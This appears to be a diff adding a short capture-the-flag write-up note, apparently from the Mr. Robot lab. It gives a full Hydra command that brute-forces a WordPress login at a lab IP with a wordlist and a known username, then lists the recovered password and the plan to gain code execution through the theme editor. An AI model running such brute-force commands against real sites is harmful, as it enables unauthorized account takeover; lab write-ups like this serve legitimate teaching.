@@ -1,0 +1,21 @@
+This image shows the use of Hydra to brute-force the WordPress login using the fsocity.dic wordlist and the known username elliot.
+
+Command Used:
+
+bash
+Copy
+Edit
+hydra -l elliot -P fsocity.dic 10.38.1.111 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=Invalid username"
+Highlights:
+
+Targeted login form at /wp-login.php
+
+Used custom dictionary from the target (fsocity.dic)
+
+Found working credential:
+
+Username: elliot
+
+Password: ER28-0652
+
+Purpose: Gain access to the WordPress admin panel for code execution via theme editor.
